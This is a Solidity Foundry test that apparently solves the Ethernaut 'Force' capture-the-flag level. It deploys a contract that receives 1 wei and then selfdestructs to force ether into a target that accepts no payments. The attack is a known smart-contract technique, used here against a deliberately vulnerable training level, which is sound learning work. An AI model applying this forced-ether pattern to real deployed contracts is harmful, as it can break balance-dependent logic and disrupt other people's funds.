// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Force/Force.sol";
import "../src/Force/ForceFactory.sol";
import "../src/Ethernaut.sol";

contract Suicide {
    address heir;

    constructor(address _heir) {
        heir = _heir;
    }

    function deleteContract() public {
        selfdestruct(payable(heir));
    }

    receive() external payable {}
}

contract ForceTest is Test {
    Ethernaut ethernaut;
    address player = makeAddr("player");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 1 ether);
        vm.label(player, "player");
    }

    function test_force_attack() public {
        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);

        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force ethernautForce = Force(payable(levelAddress));

        Suicide s = new Suicide(address(ethernautForce));

        console.log("Original, Heir contract balance:", address(s).balance);
        address(s).call{value: 1 wei}("");
        console.log(
            "After transfer, Heir contract balance:",
            address(s).balance
        );
        s.deleteContract();
        console.log(
            "After suicide, ethernautForce contract balance:",
            address(ethernautForce).balance
        );

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );

        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
